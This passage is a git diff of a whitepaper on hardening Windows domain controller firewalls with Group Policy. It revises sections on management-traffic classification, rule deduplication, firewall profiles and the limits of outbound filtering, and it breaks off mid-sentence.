@@ -13,10 +13,6 @@ keywords:
   - Group Policy
   - Security
   - RPC
-header-right: "\\hspace{1cm}"
-footer-left: "\\hspace{1cm}"
-footer-center: "Page \\thepage"
-footer-right: "\\hspace{1cm}"
 ---
 
 # Domain Controller Firewall
@@ -27,7 +23,16 @@ footer-right: "\\hspace{1cm}"
 |------------|--------:|----------------------------|-----------------|
 | 2024-05-23 | 0.8     | P. Formanek, M. Grafnetter | Public draft    |
 | 2024-08-27 | 0.9     | M. Grafnetter              | Support for more server roles and external scripts |
-|            |         |                            |                 |
+| 2024-11-20 | 1.0     | M. Grafnetter              | Document ready for review |
+
+Script files referenced by this document are versioned independently:
+
+| Script file name              | Latest version |
+|-------------------------------|---------------:|
+| `Set-ADDSFirewallPolicy.ps1`  |            2.7 |
+| `CustomRules.Sample.ps1`      |            2.6 |
+| `RpcNamedPipesFilters.txt`    |            2.1 |
+| `Show-WindowsFirewallLog.ps1` |            1.2 |
 
 ## Glossary {.unnumbered}
 
@@ -37,6 +42,8 @@ footer-right: "\\hspace{1cm}"
 | ADDS         | [Active Directory Domain Services]                    |
 | AD           | Active Directory (Domain Services)                    |
 | DNS          | Domain Name System                                    |
+| DNSSEC       | Domain Name System Security Extensions                |
+| DoH          | DNS over HTTPS                                        |
 | FQDN         | Fully Qualified Domain Name                           |
 | GPO          | Group Policy Object                                   |
 | PS           | [PowerShell]                                          |
@@ -71,6 +78,11 @@ footer-right: "\\hspace{1cm}"
 | ITDR         | Identity Threat Detection and Response                |
 | EDR          | Endpoint Detection and Response                       |
 | EFS          | Encrypting File System                                |
+| IPSec        | Internet Protocol Security                            |
+| MITM         | Man-in-the-middle or on-path attack                   |
+| TFTP         | Trivial File Transfer Protocol                        |
+| PDC          | Primary Domain Controller                             |
+| DoS          | Denial of Service                                     |
 
 [Admin Model]: https://petri.com/use-microsofts-active-directory-tier-administrative-model/
 [System Center Configuration Manager]: https://learn.microsoft.com/en-us/mem/configmgr/core/understand/introduction
@@ -86,100 +98,226 @@ footer-right: "\\hspace{1cm}"
 
 ## Summary
 
-> [!NOTE]
-> TODO: The Summary section needs to be expanded.
-
-The purpose of this tool is to simplify the deployment of a specific set of firewall rules and filters that can significantly reduce the attack surface of Domain Controllers without impacting the functionality of Active Directory.
-
-This tool provides a flexible and repeatable way to deploy a secure configuration in your environment within minutes.
+Windows Firewall with Advanced Security can sometimes be tricky to configure securely.
+As a consequence, it is usually disabled or left open for all trafic in many organizations.
+The *Domain Controller Firewall* project therefore aims to simplify the deployment of a specific set of firewall rules
+and RPC filters that can significantly reduce the attack surface of Domain Controllers (DCs),
+without impacting the functionality of Active Directory (AD).
 
 ![Windows Firewall with Advanced Security](../Images/Screenshots/dc-firewall.png)
 
-[![](../Images/Badges/license-mit.png)](https://github.com/MichaelGrafnetter/active-directory-firewall/blob/main/LICENSE)
+The purpose of this whitepaper is to serve as a comprehensive source of Windows Firewall related information.
+It includes detailed information about Windows Firewall configuration options, network protocols,
+configuration caveats, and network-based attacks. Most importantly, it provides guidance on configuring
+Windows Firewall with Advanced Security in enteprise environments to make them more secure.
 
-## Design
+To streamline the host-based firewall configuration process, we have also created the `DCFWTool` as part of this project.
+This PowerShell-based tool provides a flexible and repeatable way
+of deploying a secure DC firewall configuration within minutes.
+The functionality and configuration options of the `DCFWTool` are described in this document as well.
 
-### Key Design Decisions
+[![](../Images/Badges/license-mit.png "MIT License")](https://github.com/MichaelGrafnetter/active-directory-firewall/blob/main/LICENSE)
 
-- The tool has been tested on Windows Server 2022 and Windows 11, but it should work on all versions of Windows Server and Windows clients currently supported by Microsoft.
-- The firewall rules are designed with the assumption that you can define the following groups of IP addresses or network ranges:
-  - **Client network** (servers and client computers)
-  - **Management network** (endpoints used for Tier 0 administration)
-  - **Domain Controller network** (all DCs in your forest)
-- These rules are specifically designed for Domain Controllers and not for servers or client machines. It is expected that the DCs are only running the recommended set of roles, such as ADDS, DNS, and NTP server. No other roles have been tested.
-- The rules are intended for DCs configured with **static IP addresses**, as recommended by Microsoft.
-- The rules do not include configuration for SCOM, Backup agents, Log agents (except WEF push configuration), or any other custom agents running on DCs.
-- The configuration focuses solely on Firewall rules and **does not include IPSec rules** or DC hardening settings, except for disabling several multicast services like LLMNR or mDNS.
-- The configuration enforces GPO firewall rules only, meaning that any **local configurations on individual DCs will be ignored** during firewall rule evaluation.
-- Only **Inbound rules** are configured and enforced.
-- The configuration does not differentiate between the Domain, Private, and Public firewall profiles to avoid potential DC unavailability in case of incorrect network type detection by NLA.
-- Many services that typically use dynamic ports are configured with **static port numbers** by the tool. This allows for easier tracing and troubleshooting at the network level and simplifies rule configuration for network firewalls.
+> [!NOTE]
+> This document only focuses on the configuration of domain controller firewalls.
+> It is further expected that DCs are only running the recommended set of roles, such as ADDS, DNS, and NTP server.
+> Additional Windows Server roles, as well as management, backup, or logging agents,
+> are out of the scope of this whitepaper.
+> This document also does not cover a broader DC hardening strategy.
+
+## About the Authors
+
+![](../Images/Profile/michael-grafnetter.jpg "Michael Grafnetter"){ width=150pt align=left }
+
+[Michael Grafnetter](https://en.linkedin.com/in/grafnetter)
+is a [Microsoft MVP](https://mvp.microsoft.com/en-us/PublicProfile/5001919?fullName=Michael%20Grafnetter)
+and expert on Windows security and PowerShell.
+He is best known for inventing the [Shadow Credentials](https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204)
+attack primitive and for creating the [Directory Services Internals (DSInternals)](https://github.com/MichaelGrafnetter/DSInternals)
+PowerShell module.
+He is also the author of the [Delinea Weak Password Finder](https://delinea.com/resources/weak-password-finder-tool-active-directory)
+(formerly Thycotic) and of the [DSInternals.Passkeys](https://github.com/MichaelGrafnetter/webauthn-interop) PowerShell module.
+
+Michael enjoys sharing his knowledge during Active Directory security assessments,
+workshops, and tech talks. He presented his [security research](https://www.dsinternals.com/en/projects/)
+at many international conferences, including [Black Hat Europe](https://www.blackhat.com/eu-19/speakers/Michael-Grafnetter.html),
+[BSides Lisbon](https://bsideslisbon.org/2019/speakers/#michaelgrafnetterWorkshop),
+[HipConf New York](https://www.youtube.com/playlist?list=PLDHg9RSgIEmMyz1eN2Je1HjTDhBjRpJP4),
+[SecTor Canada](https://www.blackhat.com/sector/),
+and [TROOPERS](https://troopers.de/).
+
+![](../Images/Profile/pavel-formanek.jpg "Pavel Formanek"){ width=150pt align=right }
+
+[Pavel Formanek](https://en.linkedin.com/in/pavel-formanek-9861397)
+is CTO and co-founder of [Cloudi Support](https://www.cloudi.cz),
+which helps customers to secure their infrastructure, both on-prem and in the cloud.
+Prior to founding the company, Pavel worked many years at Microsoft as a Premier Field Engineer (PFE),
+responsible for security assessments and healthchecks of the largest EMEA Microsoft customers.
+He also created and delivered dozens of training sessions over the years.
+
+## Secure Firewall Policy Design
+
+### Overview
+
+There are many decisions one needs to make when designing a firewall policy for domain controllers.
+This chapter contains general recommendations on Windows Firewall configuration, including the reasoning behind them.
+
+When creating your own DC firewall policy, you do not need to start from scratch. Instead, you can use the `DCFWTool`,
+which will generate a GPO implementing all these recommendations.
 
 ### Host-Based Firewall vs Network-Based Firewall
 
-Most network administrators only configure network-based firewalls and turn off the [Windows Firewall](https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/) on servers. Their reasoning is that they do not want to maintain duplicate sets of firewall rules and that Windows Firewall rule management is cumbersome and inflexible.
+Most network administrators only configure network-based firewalls and turn off
+the [Windows Firewall](https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/)
+on servers. Their reasoning is that they do not want to maintain duplicate sets of firewall rules
+and that Windows Firewall rule management is cumbersome and inflexible.
 
 ![The most common DC firewall configuration](../Images/Screenshots/firewall-off.png)
 
 There are several security issues with this approach:
 
-- As network-based firewalls only filter traffic between networks, they are incapable of blocking lateral movement inside of VLANs. Their functionality might further be degraded by poor network segmentation.
-- The majority of network firewalls is incapable of differentiating between various RPC-based protocols, most of which use dynamic port numbers. The entire ephemeral TCP port range (49152-65535) is thus typically accessible on domain controllers from the entire corporate network, regardless of whether a particular port is used by the Netlogon service or for remote management of scheduled tasks.
+- As network-based firewalls only filter traffic between networks, they are incapable of blocking lateral movement
+  inside of VLANs. Their functionality might further be degraded by poor network segmentation.
+- The majority of network firewalls is incapable of differentiating between various RPC-based protocols,
+  most of which use dynamic port numbers. The entire ephemeral TCP port range (49152-65535) is thus typically accessible
+  on domain controllers from the entire corporate network, regardless of whether a particular port is used
+  by the Netlogon service or for remote management of scheduled tasks.
 - Network-based firewalls are commonly managed by dedicated teams, which might lack the required advanced Windows knowledge.
 
 ![RPC over named pipes traffic with SMBv3 encryption](../Images/Screenshots/wireshark-smb3.png)
 
-The best-practice is thus to configure both the network-based firewall and host-based firewall. Internet traffic should additionally be filtered by proxy servers.
+The best-practice is thus to configure both the network-based firewall and host-based firewall. Internet traffic should
+additionally be filtered by proxy servers.
 
-This paper only focuses on secure configuration of host-based firewalls, i.e., Windows Defender Firewall with Advanced Security, on domain controllers. However, the [Inbound Firewall Rules Reference](#inbound-firewall-rules-reference) chapter might also serve as information source for configuring network-based firewalls.
+This whitepaper only focuses on secure configuration of host-based firewalls, i.e., Windows Defender Firewall
+with Advanced Security, on domain controllers. However, the [Inbound Firewall Rules Reference](#inbound-firewall-rules-reference)
+chapter might also serve as information source for configuring network-based firewalls.
 
 ### Need for Scripting
 
-As the Windows Firewall does not provide the ability create named IP address sets, e.g., Management VLANs, manual (re)configuration of firewall rules and their source IP address ranges is cumbersome and error-prone. It is therefore recommended to use PowerShell scripts to manage Windows Firewall rules, which is what the `DCFWTool` does.
+As the Windows Firewall does not provide the ability create named IP address sets, e.g., Management VLANs,
+manual (re)configuration of firewall rules and their source IP address ranges is cumbersome and error-prone.
+We have additionally noticed that port numbers are sometimes mangled while copying firewall rules between policy objetcs.
+It is therefore strongly recommended to use PowerShell scripts to manage Windows Firewall rules,
+which is what the `DCFWTool` does.
+
+### Static IP Addresses
+
+Domain controllers should be configured with **static IP addresses**, as recommended by Microsoft.
+Failure to do so might cause network outages and would further complicate the firewall configuration.
+The firewall rule set described in this document therefore does not cover the DHCP client traffic.
 
 ### Firewall Rule Merging
 
-As mentioned in the [Key Design Decisions](#key-design-decisions) section, the set of rules is only prepared for DC-related roles and are is adjusted for various agents or non-standard roles running on a DC.  
-If you need to add additional firewall rules for your environment (DC agents, SCCM management, etc.), it is recommended to create separate GPO and define all the custom rules there.  
-Firewall rules, which are finally configured on a DC, are the outcome of all the rules merged from all the applied GPOs.  
+To ensure the domain controllers are configured in a consistent way,
+their host-based firewalls should be managed centrally through a GPO.
+Any **local settings on individual DCs should be ignored** during firewall rule evaluation.
+
+This whitepaper and the policy object created by the `DCFWTool` only cover traffic related to domain controllers
+and a few additional Windows Server roles that are often present on DCs.
+If additional environment-specific firewall rules are needed (DC agents, SCCM management, etc.),
+it is recommended to define them in separate GPOs.
+The resulting firewall rule set, which will be honored by the DCs, will contain rules from all GPOs applied to these DCs.
 
 > [!NOTE]
-> Please keep in mind that this whitepaper only focuses on the firewall configuration. It is not a security baseline and it does not cover domain controller security hardening. You should have a separate and dedicated security baseline GPO applied to your DCs.
+> Please keep in mind that this whitepaper only focuses on the firewall configuration
+> and does not cover any other aspects of domain controller security hardening.
+> You should have a separate and dedicated security baseline GPO applied to your DCs.
 
 ![GPO precedence](../Images/Screenshots/firewall-precedence-gpo.png)
 
 ### Identifying Management Traffic
 
+#### Motivation
+
+Any proper DC firewall rule design requires that administrators are able to define the following groups of IP addresses
+or network ranges:
+
+- **Client network** (servers and client computers)
+- **Management network** (endpoints used for Tier 0 administration)
+- **Domain Controller network** (all DCs in the forest)
+
+Ideally, protocols that could be (mis)used for remote command execution, should only be open from the management network(s).
+Similarly, replication traffic should only be allowed to originate from other domain controllers.
+However, not all network protocols can be categorized easily.
+
 #### The Good
 
-With some protocols, it is quite obvious that they should only be available from management networks or jump servers. This is the case of the **[Remote Desktop Protocol (RDP)](#remote-desktop---user-mode-tcp-in)** or **[Remote Event Log Management](#remote-event-log-management-rpc)**.
+With some protocols, it is quite obvious that they should only be available from management networks or jump servers.
+This is the case of the **[Remote Desktop Protocol (RDP)](#remote-desktop---user-mode-udp-in)**
+or **[Remote Event Log Management](#remote-event-log-management-rpc)**.
 
 #### The Bad
 
-There are several protocols that should primarily be used for remote system management, but some organizations also used them for client traffic.
+There are several protocols that should primarily be used for remote system management,
+but some organizations also used them for client traffic.
 
-One such example is the **[Windows Remote Management (WinRM)](#windows-remote-management-http-in)** protocol. Contrary to its name, it can not only be used by [Server Manager](https://learn.microsoft.com/en-us/windows-server/administration/server-manager/server-manager) and [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting), but also by source-initiated [Windows Event Collector](https://learn.microsoft.com/en-us/windows/win32/wec/windows-event-collector) subscriptions.
-As a best-practice, domain controllers should not be used as event forwarding targets, especially not by workstations. AD domains, where this recommendation is not followed, must first be reconfigured, before the strict firewall rules are applied to domain controllers.
+One such example is the **[Windows Remote Management (WinRM)](#windows-remote-management-http-in)** protocol.
+Contrary to its name, it can not only be used
+by [Server Manager](https://learn.microsoft.com/en-us/windows-server/administration/server-manager/server-manager)
+and [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting),
+but also by source-initiated [Windows Event Collector](https://learn.microsoft.com/en-us/windows/win32/wec/windows-event-collector)
+subscriptions.
+As a best-practice, domain controllers should not be used as event forwarding targets, especially not by workstations.
+AD domains, where this recommendation is not followed, must first be reconfigured, before the strict firewall rules
+are applied to domain controllers.
 
-Another example would be **[Active Directory Web Services (ADWS)](#active-directory-web-services-tcp-in)**. It is rare, but not unimaginable, to see legitimate PowerShell scripts with the `Get-ADUser` cmdlet running on client machines. Such scripts would stop working if ADWS is simply blocked on domain controllers.
-On the other hand, it is relatively easy to rewrite these scipts to use the built-in [DirectorySearcher](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher) class, which relies on the [LDAP](#active-directory-domain-controller---ldap-tcp-in) protocol instead of ADWS. The added value would be the removal of the [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/) PowerShell module dependency.
+Another example would be **[Active Directory Web Services (ADWS)](#active-directory-web-services-tcp-in)**. It is rare,
+but not unimaginable, to see legitimate PowerShell scripts with the `Get-ADUser` cmdlet running on client machines.
+Such scripts would stop working if ADWS is simply blocked on domain controllers.
+On the other hand, it is relatively easy to rewrite these scipts to use the built-in
+[DirectorySearcher](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher) class,
+which relies on the [LDAP](#active-directory-domain-controller---ldap-udp-in) protocol instead of ADWS.
+The added value would be the removal of the [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/)
+PowerShell module dependency.
 
-If an organization still uses the standalone [Managed Service Accounts (MSAs)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), application servers need ADWS connectivity for MSA enrollment using the [Install-ADServiceAccount](https://learn.microsoft.com/en-us/powershell/module/activedirectory/install-adserviceaccount) PowerShell cmdlet. Migration to [Group Managed Service Accounts (gMSAs)](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which do not depend on this cmdlet, is highly recommended.
+If an organization still uses the standalone [Managed Service Accounts (MSAs)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009),
+application servers need ADWS connectivity for MSA enrollment using
+the [Install-ADServiceAccount](https://learn.microsoft.com/en-us/powershell/module/activedirectory/install-adserviceaccount)
+PowerShell cmdlet. Migration to [Group Managed Service Accounts (gMSAs)](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview),
+which do not depend on this cmdlet, is highly recommended.
 
 #### The Ugly
 
-Unfortunately, there are some protocols which are required by all Windows clients, but can also be (mis)used to perform administrative operations.
+Unfortunately, there are some protocols which are required by all Windows clients, but can also be (mis)used
+to perform administrative operations.
 
-One would be highly tempted to limit the **[Directory Replication Service (DRS) Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47)** traffic to domain controllers and thus block potential [DCSync](https://adsecurity.org/?p=1729) attacks. Unfortunately, this protocol is also used by Windows clients during user logon, specifically its [IDL_DRSCrackNames](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/9b4bfb44-6656-4404-bcc8-dc88111658b3) RPC call, so it cannot simply be blocked by an L3 firewall rule.
-One solution to this problem would be the deployment of the open-source [RPC Firewall](https://github.com/zeronetworks/rpcfirewall) tool, which can selectively limit the scope of the dangerous [IDL_DRSGetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) operation. However, the project does not seem to be mature enough for production deployments. Its installation and configuration is cumbersome and requires deep understanding of the RPC protocol. Moreover, the binaries are not digitally signed, making them incompatible with some optional Windows security features, including [LSA Protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection). As a result, the most common approach is to just monitor domain controllers for unexpected replication traffic. Many products in the Identity Threat Detection and Response (ITDR) category are able to detect the DCSync attack, including [Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/what-is) and [Netwrix Threat Manager](https://www.netwrix.com/threat_detection_software.html).
+One would be highly tempted to limit the **[Directory Replication Service (DRS) Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47)**
+traffic to domain controllers and thus block potential [DCSync](https://adsecurity.org/?p=1729) attacks.
+Unfortunately, this protocol is also used by Windows clients during user logon,
+specifically its [IDL_DRSCrackNames](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/9b4bfb44-6656-4404-bcc8-dc88111658b3)
+RPC call, so it cannot simply be blocked by an L3 firewall rule.
+One solution to this problem would be the deployment of the open-source [RPC Firewall](https://github.com/zeronetworks/rpcfirewall)
+tool, which can selectively limit the scope of the dangerous
+[IDL_DRSGetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894)
+operation. However, the project does not seem to be mature enough for production deployments.
+Its installation and configuration is cumbersome and requires deep understanding of the RPC protocol.
+Moreover, the binaries are not digitally signed, making them incompatible with some optional Windows security features,
+including [LSA Protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection).
+As a result, the most common approach is to just monitor domain controllers for unexpected replication traffic.
+Many products in the Identity Threat Detection and Response (ITDR) category are able to detect the DCSync attack,
+including [Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/what-is)
+and [Netwrix Threat Manager](https://www.netwrix.com/threat_detection_software.html).
 
-The protocol that causes the most confusion among network administrators is undeniably the **[Server Message Block (SMB)](#active-directory-domain-controller---samlsa-np-tcp-in)**. Although its primary use is for file and printer sharing, it can also be used for remote system management through various RPC-based protocols. Because the functionality of AD heavily depends on the `SYSVOL` and `NETLOGON` file shares on domain controllers, the SMB protocol cannot simply be blocked on DCs. Deep packet inspection has also become less effective with the advent of SMBv3 encryption. Our approach to this issue is to [selectively block remote management over SMB named pipes](#rpc-filters).
+The protocol that causes the most confusion among network administrators is undeniably the **[Server Message Block (SMB)](#active-directory-domain-controller---samlsa-np-udp-in)**.
+Although its primary use is for file and printer sharing, it can also be used for remote
+system management through various RPC-based protocols. Because the functionality of AD heavily
+depends on the `SYSVOL` and `NETLOGON` file shares on domain controllers, the SMB protocol
+cannot simply be blocked on DCs. Deep packet inspection has also become less effective
+with the advent of SMBv3 encryption. Our approach to this issue is
+to [selectively block remote management over SMB named pipes](#rpc-filters).
 
-Also worth mentioning is the **[Lightweight Directory Access Protocol (LDAP)](#active-directory-domain-controller---ldap-tcp-in)**, which gives Active Directory its name. It can surely be used for administrative operations, e.g., privileged group membership changes, but at least it does not provide the capability to directly execute arbitrary code on DCs. And with a well-configured SIEM or an ITDR solution, modifications of sensitive AD objects can be detected almost in real-time.
+Also worth mentioning is the **[Lightweight Directory Access Protocol (LDAP)](#active-directory-domain-controller---ldap-udp-in)**,
+which gives Active Directory its name. It can surely be used for administrative operations,
+e.g., privileged group membership changes, but at least it does not provide the capability to directly
+execute arbitrary code on DCs. And with a well-configured SIEM or an ITDR solution,
+modifications of sensitive AD objects can be detected almost in real-time.
 
 ### Firewall Rule Deduplication
 
-Many of the built-in/predefined Windows Firewall rules are actually duplicates of each other, as they open the same ports, even though their names might suggest otherwise. For example, all of the following rules open port `135/TCP` for the `rpcss` service:
+Many of the built-in/predefined Windows Firewall rules are actually duplicates of each other, as they open the same ports,
+even though their names might suggest otherwise. For example, all of the following rules open
+port `135/TCP` for the `rpcss` service:
 
 - RPC Endpoint Mapper (TCP, Incoming)
 - Active Directory Domain Controller (RPC-EPMAP)
@@ -213,37 +351,50 @@ Similarly, all of these firewall rules open port `445/TCP` for `System`:
 
 ![Duplicate SMB rules](../Images/Screenshots/duplicate-smb-rules.png)
 
-Moreover, both ports 135 and 445 need to be accessible by all Windows clients for Active Directory to function properly. To keep the configuration readable, it is reasonable to consolidate the redundant rules, and to create a single firewall rule for each static port number.
+Moreover, both ports 135 and 445 need to be accessible by all Windows clients for Active Directory to function properly.
+To keep the configuration readable, it is reasonable to consolidate the redundant rules,
+and to create a single firewall rule for each static port number.
 
 ### Issues with Predefined Address Sets
 
 #### Overview of Keywords
 
-In addition to manually enumerating IP address ranges, the firewall rule scope configuration allows the use of predefined sets of computers, known as keywords.
+In addition to manually enumerating IP address ranges, the firewall rule scope configuration allows
+the use of predefined sets of computers, known as keywords.
 
 ![Predefined address sets (keywords) in Windows Firewall](../Images/Screenshots/firewall-predefined-sets.png){ width=300px }
 
-These keywords are briefly described in the [MS-FASP: Firewall and Advanced Security Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fasp/d69ec3fe-8507-4524-bdcc-813cbb3bf85f) document. However, there is no public documentation available that explains how the keywords are defined and under what circumstances the corresponding IP addresses are updated.
+These keywords are briefly described in the [MS-FASP: Firewall and Advanced Security Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fasp/d69ec3fe-8507-4524-bdcc-813cbb3bf85f)
+document. However, there is no public documentation available that explains how the keywords are defined and under
+what circumstances the corresponding IP addresses are updated.
 
 #### Intranet
 
-The *Intranet* keyword is based on the Subnet definition from Active Directory Sites and Services. However, our tests have shown that the corresponding firewall rule scopes are not re-evaluated after adding or deleting a subnet. Even multiple server reboots do not seem to resolve this issue. Due to this unreliability, we have decided not to use the *Intranet* keyword in any firewall rules.
+The *Intranet* keyword is based on the Subnet definition from Active Directory Sites and Services.
+However, our tests have shown that the corresponding firewall rule scopes are not re-evaluated after adding
+or deleting a subnet. Even multiple server reboots do not seem to resolve this issue.
+Due to this unreliability, we have decided not to use the *Intranet* keyword in any firewall rules.
 
 ![Subnets - The source for the Intranet keyword](../Images/Screenshots/firewall-keyword-intranet.png)
 
 #### Internet
 
-The *Internet* keyword is presumed to include anything not defined as the *Intranet* keyword. However, due to the unpredictable and undocumented behavior of the *Intranet* keyword, we have decided not to use the *Internet* keyword in any firewall rules as well.
+The *Internet* keyword is presumed to include anything not defined as the *Intranet* keyword.
+However, due to the unpredictable and undocumented behavior of the *Intranet* keyword,
+we have decided not to use the *Internet* keyword in any firewall rules as well.
 
 #### DNS Servers
 
-The *DNS Servers* keyword is functional and respects all DNS servers defined in the network adapter properties. If a new DNS server IP address is configured, a network adapter state change (disable/enable, server restart, etc.) is required for the corresponding firewall rules to be automatically updated.
+The *DNS Servers* keyword is functional and respects all DNS servers defined in the network adapter properties.
+If a new DNS server IP address is configured, a network adapter state change (disable/enable, server restart, etc.)
+is required for the corresponding firewall rules to be automatically updated.
 
 ![Network adapter DNS configuration](../Images/Screenshots/firewall-keyword-dns.png){ width=400px }
 
 #### Additional Keywords
 
-Additional keywords are available and although they seem to be mostly working, they are not relevant to inbound firewall rule configuration for Domain Controller:
+Additional keywords are available and although they seem to be mostly working,
+they are not relevant to inbound firewall rule configuration for Domain Controller:
 
 - Local subnet
 - DHCP servers
@@ -255,16 +406,32 @@ Additional keywords are available and although they seem to be mostly working, t
 
 ### Avoiding Localized Rule Names
 
-All of the built-in firewall rules are localized and displayed based on the OS language. However, this feature relies on RSAT being installed on the management computer. If RSAT is absent, the UI may show references to missing DLL files instead of the actual firewall rule display names.
+All of the built-in firewall rules are localized and displayed based on the OS language.
+However, this feature relies on RSAT being installed on the management computer.
+If RSAT is absent, the UI may show references to missing DLL files instead of the actual firewall rule display names.
 
 ![Localized rule names not displayed correctly](../Images/Screenshots/localization-issue.png){ width=300px }
 
-To ensure consistent firewall rule name display regardless of RSAT or the OS locale, we have decided to use only English rule names.
+To ensure consistent firewall rule name display regardless of RSAT or the OS locale,
+all rule names should be hardcoded in the PowerShell script creating them.
 
 ### Firewall Profiles
 
-> [!NOTE]
-> TODO: This section needs to be expanded.
+Windows Firewall differentiates between three network profiles that can be targeted by firewall rules:
+
+- The **Domain** profile applies to networks where the host system can authenticate to a domain controller.
+- The **Private** profile is used to designate private or home networks.
+- The **Public** profile is used to designate public networks
+  such as Wi-Fi hotspots at coffee shops, airports, and other locations.
+
+Network interfaces of Domain Controllers and other computers on corporate networks
+are automatically assigned the Domain profile.
+However, the assignment of this profile depends on the Microsoft Windows Network Location Awareness (NLA) functioning properly.
+Under specific circumstances, usually during recovery scenarios or complete power outages,
+NLA can improperly detect the network type during the system startup and thus activate a wrong firewall profile.
+
+It is therefore highly recommended to configure all firewall rules on DCs to target all 3 network profiles,
+to avoid potential loss of network connectivity.
 
 ![Windows Firewall profiles](../Images/Screenshots/firewall-profiles.png){ width=400px }
 
@@ -272,92 +439,200 @@ To ensure consistent firewall rule name display regardless of RSAT or the OS loc
 
 #### Reasons for Blocking Outbound Traffic
 
-Generally speaking, outbound firewall rules on domain controllers might play an important role in blocking NTLM relay to workstations, preventing lateral movement, breaking malware C2 channels, and mitigating the risk of data breaches.
+Generally speaking, outbound firewall rules on domain controllers might play an important role in blocking NTLM relay
+through workstations, preventing lateral movement, breaking malware C2 channels, and mitigating the risk of data breaches.
 
-On the other hand, all of the [security standards we are familiar with](#security-standards-compliance) state that Windows Firewall should allow outbound connections by default. The [CIS benchmark](#center-for-internet-security-cis-benchmark) provides this rationale:
+On the other hand, all of the [security standards we are familiar with](#security-standards-compliance) state
+that Windows Firewall should allow outbound connections by default.
+The [CIS benchmark](#center-for-internet-security-cis-benchmark) provides this rationale:
 
-> Some people believe that it is prudent to block all outbound connections except those specifically approved by the user or administrator. Microsoft disagrees with this opinion, blocking outbound connections by default will force users to deal with a large number of dialog boxes prompting them to authorize or block applications such as their web browser or instant messaging software. Additionally, blocking outbound traffic has little value because if an attacker has compromised the system they can reconfigure the firewall anyway.
+> Some people believe that it is prudent to block all outbound connections except those specifically approved
+> by the user or administrator. Microsoft disagrees with this opinion, blocking outbound connections by default will
+> force users to deal with a large number of dialog boxes prompting them to authorize or block applications
+> such as their web browser or instant messaging software. Additionally, blocking outbound traffic
+> has little value because if an attacker has compromised the system they can reconfigure the firewall anyway.
 
-Furthermore, our security research has shown that configuring a reliable allow list for outbound traffic using the built-in features of Windows is impractical. We have identified several challenges that make it difficult to implement such a list.
+Furthermore, our security research has shown that configuring a reliable allow list for outbound traffic
+using the built-in features of Windows is impractical. We have identified several challenges that make
+it difficult to implement such a list.
 
 #### Services with User Impersonation
 
-The following important Windows services initiate outbound connections, yet they locally impersonate the currently logged-on user, making it impossible to target them in service-specific Windows Firewall rules:
+The following important Windows services initiate outbound connections, yet they locally impersonate the currently
+logged-on user, making it impossible to target them in service-specific Windows Firewall rules:
 
 - Windows Update (wuauserv)
 - Cryptographic Services (CryptSvc)
 - Background Intelligent Transfer Service (BITS)
 
-To allow Windows Update to work, one would need to target the `svchost.exe` program in a firewall rule, thus allowing all services to connect to remote computers.
+This means that in order to keep Windows Update working, one would need to target the `svchost.exe` program
+in a firewall rule, thus allowing all services to connect to remote computers.
 
 #### Scheduled Tasks with Custom Handlers
 
-Some scheduled task actions are implemented using a custom DLL handler. As a result, the corresponding firewall rule would need to target the `taskhostw.exe` program, thus allowing all scheduled tasks to connect to remote computers.
+Some scheduled task actions are implemented using a custom DLL handler. As a result, the corresponding firewall
+rule would need to target the `taskhostw.exe` program, thus allowing all scheduled tasks to connect to remote computers.
 
 ![Scheduled task with a custom handler](../Images/Screenshots/scheduled-task-custom-handler.png)
 
 #### Microsoft Defender for Identity
 
-The [Network Name Resolution](https://learn.microsoft.com/en-us/defender-for-identity/nnr-policy) and [Lateral Movement Path Detection](https://learn.microsoft.com/en-us/defender-for-identity/deploy/remote-calls-sam) capabilies of Microsoft Defender for Identity depend on the domain controllers being able to connect over the RDP (TCP port 3389), RPC (TCP port 135), NetBIOS (UDP port 137), and SMB (TCP port 445) protocols to all workstations. It would thus be impossible to fully mitigate NTLM relay attacks against domain controllers using outbound firewall rules in environments with this product deployed. Moreover, the sensor needs to be able to communicate with Microsoft's servers as well.
+The [Network Name Resolution](https://learn.microsoft.com/en-us/defender-for-identity/nnr-policy)
+and [Lateral Movement Path Detection](https://learn.microsoft.com/en-us/defender-for-identity/deploy/remote-calls-sam)
+capabilies of Microsoft Defender for Identity depend on the domain controllers being able to connect
+over the RDP (TCP port 3389), RPC (TCP port 135), NetBIOS (UDP port 137), and SMB (TCP port 445) protocols
+to all workstations. It would thus be impossible to fully mitigate NTLM relay attacks against domain controllers
